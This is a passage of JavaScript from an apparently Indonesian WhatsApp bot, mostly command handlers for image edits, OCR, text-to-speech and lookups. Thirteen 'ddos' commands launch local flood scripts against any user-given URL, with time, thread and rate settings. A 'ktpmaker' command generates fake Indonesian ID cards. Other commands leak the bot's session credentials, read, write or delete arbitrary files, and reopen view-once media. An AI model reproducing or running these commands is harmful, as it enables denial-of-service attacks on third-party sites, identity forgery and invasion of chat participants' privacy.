	reply2(`*Hasil Dns Lookup ${text} :*\n\n${anu}`)
}
break
case 'fetch': {
if (!isUrl(text)) throw 'url invalid, please input a valid url. Try with add http:// or https://'
	let { href: url, origin } = new URL(text)
	let res = await fetch(url, { headers: { 'referer': origin }})
	if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) throw `Content-Length: ${res.headers.get('content-length')}`
	if (!/text|json/.test(res.headers.get('content-type'))) return await RezzHost.sendFile(m.chat, url, '', text, m)
	let txt = Buffer.from(await res.arrayBuffer())
	try {
		txt = JSON.stringify(JSON.parse(txt + ''), null, 2)
	} catch {
		txt = txt + ''
	}
	reply2(txt.trim().slice(0, 65536) + '')
}
break
case 'reversevid': {
if (!quoted) return reply(`reply Vid`)
if (!/video/.test(mime)) return reply(`Reply Vid`)
reply(mess.search)
let vid = await RezzHost.downloadAndSaveMediaMessage(quoted)
let urlv = await uptotelegra(vid)
RezzHost.sendMessage(m.chat, { video: { url: `https://api.xfarr.com/api/converted/reversevideo?apikey=${xfarApi}&url=${urlv}` }, caption: mess.success }, { quoted: kalgans })
}
break
case 'ocr': {
if (!quoted) return reply(`reply image`)
const Tesseract = require('tesseract.js')
if (!/image/.test(mime) && !/webp/.test(mime)) return reply(`Reply Image`)
		let img = await quoted.download()
		try {
			let anu = await (await Tesseract.recognize(img, 'eng')).data.text
			reply(`*Result :*\n${anu}`)
		} catch (e) {
			console.log(e)
			throw 'failed to read text.'
		}
}
break
case 'carbon': {
if (args.length == 0) return reply(`Example: ${prefix + command} print('Rerez') python`)
reply(mess.wait)
RezzHost.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/carbon?apikey=${apikey}&code=${args[0]}&language=${args[1]}`}, caption: `Created By Rerez\n\n Type: ${command}\n\nText: ${args}`}, { quoted: kalgans })
}
break
case 'disney': {
if (!text) return reply(`Example: ${prefix + command} hiu`)
reply(mess.getdata)
RezzHost.sendImage(m.chat, `https://api.yanzbotz.my.id/api/text2img/disney?prompt=${text}`, `Prompt : ${text}\n\n\n${global.footer}`, kalgans)
}
break
case 'coloring': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}* color`)
if (!text) return reply(`Example: ${prefix+command} red`)
reply(mess.getdata)
let media = await quoted.download()
let urlny = await uploadImage(media)
RezzHost.sendImage(m.chat, `https://api.xfarr.com/api/canvas/color?apikey=${xfarApi}&img=${urlny}&color=${text}`, mess.success, kalgans)
}
break
case 'invert': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.search)
let media = await quoted.download()
let urlny = await uploadImage(media)
RezzHost.sendImage(m.chat, `https://itzpire.site/maker/invert?url=${urlny}`, mess.success, kalgans)
}
break
case 'blur': {
if (!quoted) return reply(`reply image nya bang`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.search)
let media = await quoted.download()
let urlny = await uploadImage(media)
RezzHost.sendImage(m.chat, `https://itzpire.site/maker/blur?url=${urlny}`, mess.success, kalgans)
}
break
case 'darkness': {
if (!quoted) return reply(`reply image nya bang`)
if (!text) return reply(`Example :\n(reply img) ${prefix+command} 50`)
if (!/image/.test(mime)) return reply(`Send/Reply Images with the caption *.${command}*`)
reply(mess.search)
let media = await quoted.download()
let urlnya = await uploadImage(media)
RezzHost.sendImage(m.chat, `https://vihangayt.me/maker/darkness?url=${urlnya}&no=${text}`, mess.done, kalgans)
}
break
case 'resolution': case 'cekreso': {
if (!/image/.test(mime)) return reply(`Reply Image dengan Caption ${prefix + command}`)
let media = await quoted.download()
let source = await jimp.read(media)
let height = await source.getHeight()
let width = await source.getWidth()

pak = `*_RESOLUSI:_* ${width} x ${height}

*> Lebar :* ${width}
*> Tinggi :* ${height}

${footer}`
RezzHost.sendMessage(m.chat, {
text: pak,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 C E K - R E S O L U T I O N`,
body: '',
thumbnailUrl: 'https://telegra.ph/file/cac47fc63dc63800630fa.jpg',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'chord': {
	if (!text) throw `_Masukan Format Dengan Benar!_\n\n_Contoh_\n${prefix + command} mantra hujan`
	reply(mess.search)
	let result = await chord(text)
	let teks = `_*乂 Title:*_ ${result.title}
_*❃ Artist:*_ ${result.artist}
_*❃ Artist Url:*_ ${result.artistUrl}

_*❃ Chord:*_ 
${result.chord}
`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 C H O R D`,
body: '',
thumbnailUrl: `https://telegra.ph/file/9fc5c4e821f563ed71a1a.jpg`,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'chat': {
                if (!isCreator) return reply('kusus owner')
                if (!q) return reply('Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
                if (args[0] === 'mute') {
                    RezzHost.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    RezzHost.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    RezzHost.chatModify({ archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    RezzHost.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    RezzHost.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    RezzHost.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) =>reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    RezzHost.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
        break
case 'subfinder': {
if (!q) return reply(`nama domain? `)
let feta = await fetchJson(`https://api.kimzzoffc.me/api/tools/subfinder?q=${q}&apikey=${kimz}`)
if (feta.status == false) return reply(feta.data.msg)
let list = '*List Subdomain*\n\n'
for (let L of feta.result) {
list += `\nname : ${L.domain}\nDns : ${L.dns}\nProxy : ${L.cf_proxy}\n`
}
RezzHost.sendMessage(from, {text: list}, {quoted:kalgans})
        }
break
case 'grup-wa': {
if (!q) return reply(`nama grup?`)
let feta = await fetchJson(`https://api.caliph.biz.id/api/carigrup?q=${q}&apikey=${caliph}`)
if (feta.status == false) return reply(feta.data.msg)
let list = '*List group*\n\n'
for (let L of feta.data) {
list += `\nname : ${L.subject}\nLink : ${L.link}\n`
}
RezzHost.sendMessage(from, {text: list}, {quoted:kalgans})
        }
break
case 'ambilsesi':
            if (!isCreator) return reply(mess.owner)
            reply('Tunggu Sebentar, Sedang mengambil file sesi mu')
            let sesi = await fs.readFileSync('./RezzSession/creds.json')
            RezzHost.sendMessage(m.chat, { document: sesi, mimetype: 'application/json', fileName: 'haikal.json' }, { quoted: kalgans })
        break
case 'ktpmaker': {
if (!isCreator) return reply(`Owner Only`)
if (args.length == 0) return reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
get_args = args.join(" ").split("|")
nik = get_args[0]
if (!nik) return reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
prov = get_args[1]
if (!prov) return reply('probinsi mana kak')
kabu = get_args[2]
if (!kabu) return reply('kabupaten mana kak')
named = get_args[3]
if (!named) return reply('nama nya siapa kak')
ttl = get_args[4]
if (!ttl) return reply('tempat tanggal lahir nya kak')
jk = get_args[5]
if (!jk) return reply('jenis kelamin pria atau wanita kak')
jl = get_args[6]
if (!jl) return reply('alamat rumah nya mana kak')
rtrw = get_args[7]
if (!rtrw) return reply('RT / RW berapa kak')
lurah = get_args[8]
if (!lurah) return reply('kelurahan mana kak')
camat = get_args[9]
if (!camat) return reply('kecamatan mana kak')
agama = get_args[10]
if (!agama) return reply('agama nya apa kak')
nikah = get_args[11]
if (!nikah) return reply('status belum ada')
kerja = get_args[12]
if (!kerja) return reply('pekerjaan belum ada')
warga = get_args[13]
if (!warga) return reply('region belum ada')
until = get_args[14]
if (!until) return reply('waktu berlaku belum ada')
gd = get_args[15]
if (!gd) return reply('golongan darah belum ada')
img = get_args[16]
if (!img) return reply('url image belum ada')
      reply(mess.search)
bikin = (`https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gd=${gd}&almt=${jl}&rtw=${rtrw}&kel=${lurah}&kc=${camat}&agm=${agama}&st=${nikah}&krj=${kerja}&ngr=${warga}&blk=${until}&prv=${prov}&kab=${kabu}&picturl=${img}`)
console.log(bikin)
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await RezzHost.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: kalgans })
sticSukses(from)
//await sleep(5000)
}
break
case 'tts': case 'say':{
         	if (!text) reply(`Example : ${prefix + command} text`)
             let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_english?query=${text}`)
             RezzHost.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: kalgans })
         	}
         break
case 'cekweb': {
if (!text) throw `Ex: ${prefix + command} nekopoi.care`
let cwb = await fetchJson(`https://api.yanzbotz.my.id/api/tools/iplook?url=${text}`)
let cw = cwb.result
let caption = `*[ C H E C K - W E B ]*


${hiasan}*Status* : ${cw.status}
${hiasan}*Continent* : ${cw.continent}
${hiasan}*ContinentCode* : ${cw.continentCode}
${hiasan}*Country* : ${cw.country}
${hiasan}*CountryCode* : ${cw.countryCode}
${hiasan}*Region* : ${cw.region}
${hiasan}*RegionName* : ${cw.regionName}
${hiasan}*City* : ${cw.city}
${hiasan}*District* : ${cw.district}
${hiasan}*Zip* : ${cw.zip}
${hiasan}*Lat* : ${cw.lat}
${hiasan}*Lon* : ${cw.lon}
${hiasan}*Timezone* : ${cw.timezone}
${hiasan}*Offset* : ${cw.offset}
${hiasan}*Currency* : ${cw.currency}
${hiasan}*Isp* : ${cw.isp}
${hiasan}*Org* : ${cw.org}
${hiasan}*As* : ${cw.as}
${hiasan}*AsName* : ${cw.asname}
${hiasan}*Reverse* : ${cw.reverse}
${hiasan}*Mobile* : ${cw.mobile}
${hiasan}*Proxy* : ${cw.proxy}
${hiasan}*Hosting* : ${cw.hosting}
${hiasan}*Query* : ${cw.query}

`
RezzHost.sendMessage(m.chat, {
text: caption,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: tag,
body: '',
thumbnailUrl: "https://telegra.ph/file/5d6bf69d0f1abcced9029.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'resize': {
if (!mime) throw 'Reply to an image or video.';
if (!text) throw 'Enter the new file size for the image/video.';
if (isNaN(text)) throw 'Only numbers are allowed👻.'; 
if (!/image\/(jpe?g|png)|video|document/.test(mime)) throw 'Unsupported format.';
  
  let img = await quoted.download();
  let url = await uploadImage(img);

  if (!/image\/(jpe?g|png)/.test(mime)) {
    RezzHost.sendMessage(m.chat, { image: { url: url }, caption: '```Success...\nDont forget to donate```', fileLength: `${text}`, mentions: [m.sender] }, { ephemeralExpiration: 24 * 3600, quoted: m });
  } else if (/video/.test(mime)) {
    return RezzHost.sendMessage(m.chat, { video: { url: url }, caption: '```Success...\nDont forget to donate```', fileLength: `${text}`, mentions: [m.sender] }, { ephemeralExpiration: 24 * 3600, quoted: m });
  }
  }
break
case 'bypassmiror':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} https://www.mirrored.to/files/EB7BOJU3/[NekoPoi]_Isekai_Harem_Monogatari_-_04_[720P][nekopoi.care].mp4_links`)
reply(mess.search)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/mirrorcreator?apikey=${apikey}&url=${text}`)
let teks = `乂 *B Y P A S S - M I R R O R*\n\n`
teks += `*Gofileio* : ${anu.result.gofileio}\n`
teks += `*Userscloud* : ${anu.result.userscloud}\n`
teks += `*GoogleDrive* : ${anu.result.googledrive}\n`
teks += `*DropApk* : ${anu.result.dropapk}\n`
teks += `*Racaty* : ${anu.result.racaty}\n`
teks += `*VideobinCo* : ${anu.result.videobinco}\n\n\n`
teks += `${footer}\n\n───────────────`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 B Y P A S S - M I R R O R`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'bypassouo': {
if (args.length == 0) return reply(`Example: ${command} https://ouo.io/8BgQ1w`)
lnk = await fetchJson(`https://api.lolhuman.xyz/api/ouo?apikey=${apikey}&url=${text}`)
reply2(lnk.result)
}
break
case 'shortlink':
                    if (args.length == 0) return reply(`Example: ${command} https://api.lolhuman.xyz`)
                    ini_link = args[0]
                    ini_buffer = await fetchJson(`https://api.lolhuman.xyz/api/shortlink?apikey=${apikey}&url=${ini_link}`)
                    reply(ini_buffer.result)
                    break
case 'readmore': {
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
 if (!q.includes('|')) return  reply("Penggunaan teks| teks")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
reply( text1 + readmore + text2)
}
break
// DDOS FEATURE
case 'ddos': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez/ddos/BROW-X.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v1': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv1.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v2': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv2.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v3': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv3.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v4': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv4.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v5': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv5.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v6': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv6.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v7': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv7.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v8': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv8.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v9': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv9.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v10': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv10.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v11': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv11.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-v12': {
if (!isCreator) return reply(mess.owner)  
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
reply2(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./xyrez ddos/ddosv12.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
case 'ddos-mix': {
if (!isCreator) return reply(mess.owner)  
if (!q.includes(' ')) return m.reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
const targetweb = q.substring(0, q.indexOf(' ') - 0)
const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
m.reply(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]`)
exec(`node ./xyrez ddos/ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
if (error) {
m.reply(`Error: ${error.message}`);
return;
}
if (stderr) {
m.reply(`Error: ${stderr}`);
return;
}
m.reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
});  
}
break
case 'berkas': case 'file': {
if (!isCreator) return reply('kusus owner')
if (args.length < 1) return reply ("*Mau nyari file apa kak*")
sendfile = `${q}`
anuu = fs.readFileSync(sendfile)
RezzHost.sendMessage(m.chat, {document: anuu, mimetype: 'application/javascript', fileName: `${q}`}, {quoted:kalgans})
}
break
case 'df': {
if (!text) return reply2('Masukan Nama File Nya!')
let path = `./${text}`;
 if (!fs.existsSync(path)) return reply2(`file ${text}.js tidak ditemukan`);
 fs.unlinkSync(path);
 reply2(`file ${text}.js berhasil dihapus`);
}
break
case 'sf': {
if(!isCreator) return reply2(mess.owner)
if (!q) return reply2( `Mau di simpen di mana?? (⁠*⁠・⁠～⁠・⁠*⁠)\n\nContoh:\n${command} lib/tes.js`)
if (!m.quoted.text) return reply2(`Hmmm`)
let path = `${q}`
await require('fs').writeFileSync(path, m.quoted.text)
reply2(`Tersimpan di ${path} (⁠￣⁠ヘ⁠￣)`)
}
break
case 'gi': {
 if (!isCreator) return reply2('Only Owner')
 if (!text) return reply2('Mau cari file apa (⁠ ⁠╹⁠▽⁠╹⁠ ⁠)')
 let sei = fs.readFileSync(`./media/${text}`)
 RezzHost.sendImage(m.chat, sei)
 }
 break
case 'style': case 'styletext': {
		let { styletext } = require('./lib/scrape/scraper')
		if (!text) return reply('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                reply(teks)
	    }
	    break
case 'snobg': {
if (!quoted) return reply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let encmedia = await RezzHost.sendImageAsSticker(m.chat, await rmbg(media), kalgans, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Send/Reply Images With Captions ${prefix+command}`)
}
}
break
case 'ebinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { eBinary } = require('./lib/scrape/binary')
let eb = await eBinary(`${q}`)
reply(eb)
}
break
case 'dbinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { dBinary } = require('./lib/scrape/binary')
let db = await dBinary(`${q}`)
reply(db)
}
break
case 'fliptext': {
if (!isCreator) return reply(`Example:\n${prefix}fliptext ${owner}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
case 'detectqr': {
try {
mee = await RezzHost.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
const res = await fetch(`http://api.qrserver.com/v1/read-qr-code/?fileurl=${mem}`)
const data = await res.json() 
reply(util.format(data[0]))
} catch (err) {
reply(`Reply Image Yang Ada Qr Nya`)
}
}
break
case 'openvonce': {
if (!isCreator) return reply(mess.owner)
if (!m.quoted) return reply(`Reply view once message to use this command`)
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
var media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (let chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/audio/.test(type)) {
await RezzHost.sendMessage(m.chat, { audio: buffer, caption: quotedType.caption }, {quoted: kalgans })
}
}
break
case 'vonce': { 
if (!quoted) throw 'Reply Vn/Aud'
if (/audio/.test(mime)) {
anu = await RezzHost.downloadAndSaveMediaMessage(quoted)
RezzHost.sendMessage(from, {audio: {url: anu},viewOnce : true},{quoted: m })
}
}
break
case 'once': case 'toonce': { 
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await RezzHost.downloadAndSaveMediaMessage(quoted)
RezzHost.sendMessage(from, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await RezzHost.downloadAndSaveMediaMessage(quoted)
RezzHost.sendMessage(from, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break
case 'buka':
case 'readvo':
case 'rvo':
case 'duar': {
if (!isCreator) return reply(mess.owner)
await RezzHost.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  await RezzHost.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
	if (!m.quoted) return reply(`balas foto/video 1x lihat`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return reply(`yang anda balas bukan foto/video 1x lihat`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
